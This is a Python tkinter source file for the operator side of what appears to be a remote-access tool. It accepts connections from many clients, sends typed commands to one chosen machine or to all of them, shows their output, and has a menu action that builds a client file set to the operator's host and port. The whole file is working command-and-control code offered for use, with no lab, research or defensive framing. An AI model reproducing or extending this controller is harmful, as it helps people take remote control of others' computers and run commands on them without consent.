from tkinter import *
from tkinter import ttk, scrolledtext
import threading, time, nadnetworking, nadfuncs


class MultiClientServerForGui(nadnetworking.MultiClientServer):

    def __init__(self, clients_combobox):
        nadnetworking.MultiClientServer.__init__(self)
        self.clients_combobox = clients_combobox

    def accept(self):
        addresses = []
        while self.server_running:
            connection, address = self.sock.accept()
            client = {"conn": connection, "addr": address}
            self.clients.append(client)
            addresses.append(address[0])
            self.clients_combobox["values"] = addresses


class ProgramGuiMain(object):

    def __init__(self, title, width, height):
        self.title = title
        self.root = Tk()
        self.root.title(title)
        self.root.geometry("{0}x{1}".format(width, height))

        self.serverState = StringVar(self.root, "Server state: not running")

        self.controlAllClientsMode = False
        self.serverRunningState = False # dont remember why i made it, save it to not destroy anything for now

        self.root.resizable(False, False)

        self.set_menu()
        self.set_gui_body()

        self.serverSock = MultiClientServerForGui(self.chooseClientCombobox)
        self.nadFuncs = nadfuncs.Functions()

        serverStateUpdater = threading.Thread(target=self.update_server_state)
        serverStateUpdater.start()

    def __call__(self):
        self.root.mainloop()

    def set_icon(self, path):
        self.root.iconbitmap(path)

    def set_menu(self):
        menu_bar = Menu(self.root)

        file_menu = Menu(menu_bar, tearoff=0)
        file_menu.add_command(label="Exit", command=self.root.quit)

        new_menu = Menu(menu_bar, tearoff=0)
        new_menu.add_command(label="set server", command=lambda:self.set_server_event(f"{self.title} - Set Server", 370, 100))
        new_menu.add_command(label="stop server", command=lambda:self.serverSock.close())
        new_menu.add_command(label="create client file", command=lambda:self.create_client_event(f"{self.title} - Create Client", 400, 140))

        menu_bar.add_cascade(label="File", menu=file_menu)
        menu_bar.add_cascade(label="Actions", menu=new_menu)

        self.root.config(menu=menu_bar)

    def set_gui_body(self):
        title = Label(self.root, text=self.title, font=("Arial", 15))
        title.place(x=160, y=1)

        serverStateLabel = Label(self.root, textvariable=self.serverState)
        serverStateLabel.place(x=190, y=30)

        self.chooseClientCombobox = ttk.Combobox(self.root, width=20)  # need to add values=clients_list
        self.chooseClientCombobox.place(x=350, y=80)
        controlModeLabel = Label(self.root, text="Control mode:")
        controlModeLabel.place(x=60, y=80)
        controlMode = Radiobutton(self.root, text="specific client", variable=self.controlAllClientsMode, value=False, command=lambda:self.control_mode_event(False, self.chooseClientCombobox))
        controlMode.place(x=150, y=80)
        controlMode.select()
        controlMode2 = Radiobutton(self.root, text="all clients", variable=self.controlAllClientsMode, value=True, command=lambda:self.control_mode_event(True, self.chooseClientCombobox))
        controlMode2.place(x=260, y=80)

        commandLabel = Label(self.root, text="Command:")
        commandLabel.place(x=60, y=120)
        self.commandEntry = Entry(self.root, width=47)
        self.commandEntry.place(x=130, y=120)
        commandExecuteButton = Button(self.root, text="Execute", width=8, command=self.send_and_recv)
        commandExecuteButton.place(x=430, y=120)

        outputLabel = Label(self.root, text="Output:")
        outputLabel.place(x=1, y=150)
        self.commandOutputScrolledtext = scrolledtext.ScrolledText(self.root, width=65, height=13, state=DISABLED)
        self.commandOutputScrolledtext.place(x=1, y=170)

    def update_server_state(self):
        while True:
            try:
                if self.serverSock.server_running:
                    self.serverState.set("Server state: running")
                else:
                    self.serverState.set("Server state: not running")
            except:
                continue
            time.sleep(2)

    def send_and_recv(self):
        if self.controlAllClientsMode:
            for client in self.serverSock.clients:
                command = self.commandEntry.get()
                self.send_cmd(client["conn"], client["addr"][0], command)
        else:
            address = self.chooseClientCombobox.get()
            client = self.get_client_by_address(self.serverSock.clients, address)
            command = self.commandEntry.get()
            self.send_cmd(client, address, command)

    def send_cmd(self, client, addr, cmd):
        self.serverSock.send_data(client, cmd.encode())
        output = self.serverSock.recv_data(client, 6000).decode()
        self.commandOutputScrolledtext.config(state=NORMAL)
        self.commandOutputScrolledtext.insert(END, "Executed on: {0}\n{1}\n".format(addr, output))
        self.commandOutputScrolledtext.config(state=DISABLED)
        self.commandEntry.delete(0, END)


    def get_client_by_address(self, clients_list, addr):
        for client in clients_list:
            if client["addr"][0] == addr:
                return client["conn"]

    def menu_stop_server_event(self): # need to fix bug
        self.serverSock.stop()

    def button_start_server_event(self):
        self.serverSock.config(self.serverHostEntry.get(), int(self.serverPortEntry.get()), 100)
        self.serverSock()
        self.setServerWindowTop.destroy()

    def control_mode_event(self, mode, comboboxItem):
        if mode:
            comboboxItem.config(state=DISABLED)
            self.controlAllClientsMode = True
        else:
            comboboxItem.config(state=NORMAL)
            self.controlAllClientsMode = False

    def set_server_event(self, title, width, height):
        self.setServerWindowTop = Toplevel(self.root)
        self.setServerWindowTop.resizable(False, False)
        self.setServerWindowTop.title(title)
        self.setServerWindowTop.geometry("{0}x{1}".format(width, height))

        hostLabel = Label(self.setServerWindowTop, text="Host:", font=("Arial", 15))
        hostLabel.grid(row=0, column=0)
        self.serverHostEntry = Entry(self.setServerWindowTop)
        self.serverHostEntry.grid(row=0, column=1)

        portLabel = Label(self.setServerWindowTop, text="Port:", font=("Arial", 15))
        portLabel.grid(row=1, column=0)
        self.serverPortEntry = Entry(self.setServerWindowTop)
        self.serverPortEntry.grid(row=1, column=1)

        setServerButton = Button(self.setServerWindowTop, text="Start server", command=self.button_start_server_event)
        setServerButton.place(x=60, y=70)

        self.setServerWindowTop.mainloop()

    def create_client_event(self, title, width, height):
        self.createClientWindowTop = Toplevel(self.root)
        self.createClientWindowTop.resizable(False, False)
        self.createClientWindowTop.title(title)
        self.createClientWindowTop.geometry("{0}x{1}".format(width, height))

        hostLabel = Label(self.createClientWindowTop, text="Host:", font=("Arial", 15))
        hostLabel.grid(row=0, column=0)
        self.clientHostEntry = Entry(self.createClientWindowTop)
        self.clientHostEntry.grid(row=0, column=1)

        portLabel = Label(self.createClientWindowTop, text="Port:", font=("Arial", 15))
        portLabel.grid(row=1, column=0)
        self.clientPortEntry = Entry(self.createClientWindowTop)
        self.clientPortEntry.grid(row=1, column=1)

        clientFileNameLabel = Label(self.createClientWindowTop, text="Name:", font=("Arial", 15))
        clientFileNameLabel.grid(row=2, column=0)
        self.clientFileNameEntry = Entry(self.createClientWindowTop)
        self.clientFileNameEntry.grid(row=2, column=1)

        createClientButton = Button(self.createClientWindowTop, text="Create client file", command=self.create_client_file_event)
        createClientButton.place(x=60, y=100)

        self.createClientWindowTop.mainloop()

    def create_client_file_event(self):
        self.nadFuncs.create_client_file(self.clientFileNameEntry.get(), self.clientHostEntry.get(), self.clientPortEntry.get())
        self.createClientWindowTop.destroy()